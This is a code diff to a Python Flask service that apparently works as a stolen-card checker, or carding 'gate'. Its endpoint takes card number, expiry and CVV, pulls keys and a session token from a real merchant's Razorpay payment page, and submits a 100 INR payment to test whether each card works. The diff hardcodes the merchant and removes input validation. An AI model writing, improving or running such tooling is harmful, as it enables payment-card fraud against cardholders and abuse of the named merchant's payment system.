@@ -21,6 +21,7 @@ from flask import Flask, request, jsonify
 # Flask setup
 app = Flask(__name__)
 
+# Rest of your existing code
 logging.basicConfig(level=logging.WARNING)
 
 request_queue = Queue(maxsize=100)
@@ -268,7 +269,7 @@ def process_single_card(card_index, cc_line, payment_link_id, amount_paise, paym
         card_number, exp_month, exp_year, cvv = cc_line.split('|')
         result['card_masked'] = f"{card_number[:6]}******{card_number[-4:]}"
     except ValueError:
-        result['status'] = "Invalid card format. Expected: card_no|mm|yy|cvv"
+        result['status'] = "Invalid card format in cards.txt. Skipping."
         result['time'] = round(time.time() - start_time, 2)
         return result
 
@@ -476,7 +477,7 @@ def process_card_request(request_data):
         return {'error': str(e)}
 
 # Flask endpoint
-@app.route('/gate=rz/cc=<string:card_info>', methods=['GET'])
+@app.route('/gate=rz/cc=<card_info>', methods=['GET'])
 def process_payment(card_info):
     try:
         # Parse card information
@@ -484,100 +485,60 @@ def process_payment(card_info):
         if len(card_parts) != 4:
             return jsonify({
                 'status': 'error',
-                'message': 'Invalid card format. Expected: card_no|mm|yy|cvv'
-            }), 400
+                'message': 'Invalid card format. Expected: card_number|mm|yy|cvv'
+            })
         
         card_number, exp_month, exp_year, cvv = card_parts
         
-        # Validate card number (basic check)
-        if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
-            return jsonify({
-                'status': 'error',
-                'message': 'Invalid card number'
-            }), 400
+        # Use default merchant data from fallback_data
+        merchant_handle = 'hotelparasinternationaldelhi'
+        site_url = f"https://razorpay.me/@{merchant_handle}"
         
-        # Validate expiry month
-        if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
-            return jsonify({
-                'status': 'error',
-                'message': 'Invalid expiry month'
-            }), 400
+        # Get merchant data
+        keyless_header, key_id, payment_link_id, payment_page_item_id, error = extract_merchant_data_direct(site_url)
         
-        # Validate expiry year
-        if not exp_year.isdigit():
-            return jsonify({
-                'status': 'error',
-                'message': 'Invalid expiry year'
-            }), 400
-        
-        # Handle 2-digit year
-        if len(exp_year) == 2:
-            exp_year = '20' + exp_year
-        
-        # Validate CVV
-        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
-            return jsonify({
-                'status': 'error',
-                'message': 'Invalid CVV'
-            }), 400
-        
-        # Get merchant URL from query parameters
-        merchant_url = request.args.get('merchant_url', 'https://razorpay.me/@hotelparasinternationaldelhi')
-        
-        # Get amount from query parameters (default to 100 INR)
-        amount = request.args.get('amount', '100')
-        try:
-            amount_paise = int(float(amount) * 100)  # Convert to paise
-        except ValueError:
-            amount_paise = 10000  # Default to 100 INR
-        
-        # Get proxy from query parameters
-        proxy_string = request.args.get('proxy', '')
-        global PROXY_CONFIG
-        PROXY_CONFIG = setup_proxy(proxy_string)
-        
-        # Extract merchant data
-        keyless_header, key_id, payment_link_id, payment_page_item_id, error = extract_merchant_data_direct(merchant_url)
         if error:
             return jsonify({
                 'status': 'error',
-                'message': f'Merchant data extraction failed: {error}'
-            }), 500
+                'message': f'Failed to extract merchant data: {error}'
+            })
         
         # Get session token
         session_token, token_error = get_dynamic_session_token()
+        
         if token_error:
             return jsonify({
                 'status': 'error',
-                'message': f'Session token generation failed: {token_error}'
-            }), 500
+                'message': f'Failed to get session token: {token_error}'
+            })
         
-        # Process the card
-        card_line = f"{card_number}|{exp_month}|{exp_year}|{cvv}"
+        # Set default amount (100 INR = 10000 paise)
+        amount_paise = 10000
+        
+        # Process the payment
         result = process_single_card(
             0,  # card_index
-            card_line,
+            card_info,  # cc_line
             payment_link_id,
             amount_paise,
             payment_page_item_id,
             key_id,
             keyless_header,
             session_token,
-            merchant_url
+            site_url
         )
         
-        # Return the result
         return jsonify(result)
-    
+        
     except Exception as e:
         return jsonify({
             'status': 'error',
             'message': f'Unexpected error: {str(e)}'
-        }), 500
+        })
 
 def main():
     # Start worker threads
-    for _ in range(5):
+    for _ in range(3):
         threading.Thread(target=process_request_worker, daemon=True).start()
     
     # Run Flask app
